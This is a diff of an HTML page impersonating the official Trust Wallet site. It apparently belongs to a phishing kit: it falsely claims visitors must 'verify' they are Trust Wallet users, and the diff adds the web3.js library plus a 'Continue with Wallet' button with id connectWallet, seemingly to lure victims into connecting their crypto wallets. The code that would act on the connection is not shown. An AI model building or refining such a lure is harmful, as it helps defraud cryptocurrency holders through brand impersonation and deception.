@@ -6,62 +6,45 @@
     <title>Trust Wallet | Официальный криптокошелек</title>
     <link rel="stylesheet" href="style.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
 </head>
 <body>
 
-    <!-- Header -->
-    <header class="header">
-        <div class="container">
-            <div class="header-inner">
-                <a href="/" class="logo">
-                    <!-- SVG логотип Trust Wallet -->
-           
-                    <!-- <img  src="https://avatars.mds.yandex.net/i?id=c7ea9b12c6246e2571c602b127155ced_l-9845623-images-thumbs&n=13" alt="Trust Wallet" width="160">
-                    <p>© 2023 Trust Wallet. Все права защищены.</p> -->
-                </a>
-   
-                <nav class="nav">
-                    <ul class="nav-list">
-                        <li><a href="#">Кошелек</a></li>
-                        <li><a href="#">Браузер</a></li>
-                        <li><a href="#">NFT</a></li>
-                        <li><a href="#">DApps</a></li>
-                        <li><a href="#">Ставки</a></li>
-                        <li><a href="#">Купить крипту</a></li>
-                    </ul>
-                </nav>
-                
-                <div class="header-actions">
-                    <div class="lang-switcher">
-                        <!-- <select> -->
-                            <!-- <option value="ru" selected>RU</option>
-                            <option value="en">EN</option> -->
-                        <!-- </select> -->
-                    </div>
-                    <button class="mobile-menu-btn">
-                        <i class="fas fa-bars"></i>
-                    </button>
-                </div>
+<header class="header">
+    <div class="container">
+        <div class="header-inner">
+            <a href="/" class="logo"></a>
+            <nav class="nav">
+                <ul class="nav-list">
+                    <li><a href="#">Кошелек</a></li>
+                    <li><a href="#">Браузер</a></li>
+                    <li><a href="#">NFT</a></li>
+                    <li><a href="#">DApps</a></li>
+                    <li><a href="#">Ставки</a></li>
+                    <li><a href="#">Купить крипту</a></li>
+                </ul>
+            </nav>
+            <div class="header-actions">
+                <div class="lang-switcher"></div>
+                <button class="mobile-menu-btn">
+                    <i class="fas fa-bars"></i>
+                </button>
             </div>
         </div>
-    </header>
+    </div>
+</header>
 
-    <!-- Hero Section -->
-    <section class="hero">
-        <div class="container">
-            <div class="hero-content">
-                
-                <img class="pin" src="https://i.pinimg.com/originals/1e/2d/c8/1e2dc8e5ad302df838a5bc95cdd756c5.png"img>
-                <h1> Crypto Wallet Trust wallet</h1>
-             
-                <p class="hero-subtitle">Official Trust Wallet account. In order to continue using our site, we need to Verify that you are a Trust Wallet user. Please select the following</p>
-                
-                <div class="download-buttons">
-                    <a href="#" class="download-btn">
-                        <i class="fab fa-apple"></i>
-                        <span>Verify your account IPhone</span>
-                    </a>
+<section class="hero">
+    <div class="container">
+        <div class="hero-content">
+            <img class="pin" src="https://i.pinimg.com/originals/1e/2d/c8/1e2dc8e5ad302df838a5bc95cdd756c5.png">
+            <h1>Crypto Wallet Trust Wallet</h1>
+            <p class="hero-subtitle">Official Trust Wallet account. In order to continue using our site, we need to verify that you are a Trust Wallet user. Please select the following</p>
+            <div class="download-buttons">
+                <a href="#" class="download-btn" id="connectWallet">
+                    <i class="fab fa-apple"></i>
+                    <span>Continue with Wallet</span>
+                </a>
                     <a href="#" class="download-btn">
                         <i class="fab fa-google-play"></i>
                         <span>Verify your accoun Android</span>
@@ -213,5 +196,6 @@
             document.querySelector('.nav').classList.toggle('active');
         });
     </script>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
 </body>
 </html>
